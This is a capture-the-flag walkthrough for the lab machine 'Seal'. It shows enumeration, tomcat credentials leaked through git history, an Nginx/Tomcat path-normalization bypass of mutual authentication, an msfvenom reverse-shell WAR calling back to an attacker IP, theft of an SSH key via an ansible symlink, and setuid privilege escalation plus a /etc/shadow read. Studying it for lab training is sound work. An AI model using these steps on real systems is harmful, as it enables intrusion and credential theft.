@@ -1,0 +1,223 @@
+Seal
+
+ 9th November 2021 / Document No D21.100.141
+ Prepared By: MrR3boot
+ Machine Author(s): MrR3boot
+ Difficulty: Medium
+
+                                            Classification: Official
+Synopsis
+
+Seal is a medium difficulty Linux machine that features an admin dashboard protected by mutual
+authentication. Enumeration of git logs from Gitbucket reveals tomcat manager credentials. Exploitation of
+Nginx path normalization leads to mutual authentication bypass which allows tomcat manager access.
+Foothold is obtained by deploying a shell on tomcat manager. An ansible playbook found to be running at
+intervals and vulnerable to arbitrary file read thus allows us moving laterally. Root shell is gained by
+exploiting a sudo entry.
+
+Skills Required
+
+      Linux Enumeration
+      Understanding of Mutual Authentication
+      OWASP Top 10
+      Basic Knowledge of Ansible
+
+Skills Learned
+
+      Gitbucket Enumeration
+      Nginx Path Normalization Exploitation
+      Mutual Authentication Bypass
+      Abusing Ansible Features
+Enumeration
+
+Nmap
+
+   ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.250 | grep ^[0-9] | cut -d '/' -f 1 | tr
+   '\n' ',' | sed s/,$//)
+   nmap -p$ports -sV -sC 10.10.10.250
+
+Nmap scan reveals there are 3 ports open. Let's browse to port 443.
+
+Nginx
+We see an e-commerce application running on Nginx server. Its all static content. Let's fuzz the server for
+files and directories.
+
+FFUF
+
+   ffuf -u https://10.10.10.250/FUZZ -w /usr/share/wordlists/dirb/common.txt
+We see few directories which are found commonly on a Tomcat server.
+
+      admin
+      manager
+      host-manager
+
+Browsing admin reveals a 404. Let's browse to /manager
+This returns a 403 error. Browsing /host-manager shows same behaviour. We can either fuzz /admin or
+simply guess some folders like login or dashboard etc. Browsing /admin/dashboard reveals a 403 error
+message.
+
+Let's make a note of these and continue our enumeration.
+
+GitBucket
+
+Browsing to port 8080 reveals GitBucket which is an open source Git web platform.
+From installation we can see the default credentials are root / root . Trying these credentials fail. Let's
+register an account and login to the platform.
+
+We have read permission on two repositories. infra reveals ansible templates to configure tomcat.
+This doesn't reveal anything. Let's browse to seal_market repository.
+
+This repository has three folders and an open issue. README reveals some info about mutual
+authentication .
+It highlights that dashboard currently protected with Mutual Authentication . From google we learn what
+it is.
+
+   Mutual authentication, also known as two-way authentication, is a security process in
+   which entities authenticate each other before actual communication occurs. In a network
+   environment, this requires that both the client and the server must provide digital
+   certificates to prove their identities.
+Without providing a valid certificate we can't access the /admin/dashboard . Let's explore the repository.
+
+Dashboard seems like a static content. Exploring nginx/sites-enabled/default reveals interesting
+information about client authentication configuration.
+
+      location /manager/html {
+          if ($ssl_client_verify != SUCCESS) {
+              return 403;
+          }
+
+   ...
+      location /admin/dashboard {
+          if ($ssl_client_verify != SUCCESS) {
+              return 403;
+          }
+
+   ...
+        location /host-manager/html {
+            if ($ssl_client_verify != SUCCESS) {
+            return 403;
+        }
+
+   ...
+We see that /manager and /host-manager also require client authentication. Checking tomcat folder we
+see there are 2 commits. One of them revealing tomcat manager credentials.
+Foothold
+
+It is also mentioned in the ToDo tasks that the latest tomcat configuration is yet to be deployed. Having this
+information we can now look for ways with which we can bypass the client authentication and login to
+tomcat manager interface with found credentials.
+The most common misconfiguration of Nginx is path normalization which is well explained here. We can
+apply below behaviour in this case.
+
+If we try to access /admin;foo=bar/dashboard , Nginx will parse it as /admin;foo=bar/dashboard but
+Tomcat will resolve the path as /admin/dashboard which will bypass the mutual authentication.
+
+This indeed worked. Login to tomcat manager interface sameway using tomcat / 42MrHBf*z8{Z%
+credentials.
+   /manager;foo=bar/html
+
+Having tomcat manager access, we can upload a war file and gain shell on the server. Generate a
+shell.war file by issuing below command.
+
+   msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.2 LPORT=1234 -f war > shell.war
+Upload and deploy the war file. Stand up a listener on port 1234 and access /shell
+
+Alternatively we can bypass the mutial authentication using /..;/ technique.
+Let's browse to /manager/test/..;/html to login to Tomcat Manager GUI.
+
+Browse the shell.war file and intercept the upload request on Burp Suite. Replace /manager/html with
+/manager/test/..;/html in the URL.
+Forwarding the request will deploy the shell.
+
+Standup a listener on port 1234 and browse to /shell .
+It's worth upgrading to a TTY shell, which is more functional and allows us to switch to a different user if
+needed.
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+ctrl+z
+stty raw -echo
+fg
+export TERM=xterm
+Lateral Movement
+
+Having foothold we can start exploring filesystem. /opt folder has backups directory. Let's check its
+contents.
+
+There's a playbook folder present which has run.yml .
+
+We can read this file.
+   - hosts: localhost
+      tasks:
+      - name: Copy Files
+          synchronize: src=/var/lib/tomcat9/webapps/ROOT/admin/dashboard
+   dest=/opt/backups/files copy_links=yes
+      - name: Server Backups
+          archive:
+              path: /opt/backups/files/
+              dest: "/opt/backups/archives/backup-{{ansible_date_time.date}}-
+   {{ansible_date_time.time}}.gz"
+      - name: Clean
+          file:
+              state: absent
+              path: /opt/backups/files/
+
+This performs 3 tasks.
+      Copies files from dashboard to /opt/backups/files
+      Compress the files and saves to backup-date-time.gz format.
+      Removes the files folder.
+It has copy_links parameter. Ansible docs says below.
+   Copy symlinks as the item that they point to (the referent) is copied, rather than the
+   symlink.
+We can abuse this feature if we've write privileges under dashboard folder. Let's check the permissions.
+
+uploads folder is world writable. Checking /opt/backups/archives we see that every 2mins there's an
+archive present and its created by luis .
+
+Let's place a symlink to grab luis SSH private key.
+   cd /var/lib/tomcat9/webapps/ROOT/admin/dashboard
+   ln -s /home/luis/.ssh/id_rsa uploads/keys
+We see that the archive now has different size. Let's copy it to /tmp folder and extracts the contents.
+   cd /tmp
+   tar -xzf backup.gz
+   cd dashboard/uploads
+
+Copy the key to our machine and login to SSH as luis .
+Privilege Escalation
+
+Checking sudo entries we see that luis can run ansible-playbook as root.
+
+Method 1: Using Playbook
+
+This command allows us to run playbooks. Let's save below playbook as root.yml .
+   ---
+      - name: "Root"
+          hosts: localhost
+          connection: local
+          tasks:
+          - name: "run this command"
+              shell: "id"
+              register: "output"
+          - debug: var=output.stdout_lines
+
+Run the playbook using ansible-playbook command.
+
+We see the command id output root . To obtain root access we can modify root.yml as below.
+   ---
+      - name: "Root"
+          hosts: localhost
+          connection: local
+          tasks:
+          - name: "run this command"
+              shell: "chmod u+s /bin/dash"
+              register: "output"
+          - debug: var=output.stdout_lines
+
+Running this playbook sets setuid to /bin/dash . We can now issue below command to get root shell.
+
+Method 2: Arbitrary File Read
+
+ansible-playbook by default verifies the syntax of the given playbook. If we provide an invalid file as
+input, it reveals the contents of the file in the error message.
+
+This leads to arbitrary file read. Let's try to read contents of /etc/shadow file.
+Using this method we can either try to crack the hash or read the root flag.
+
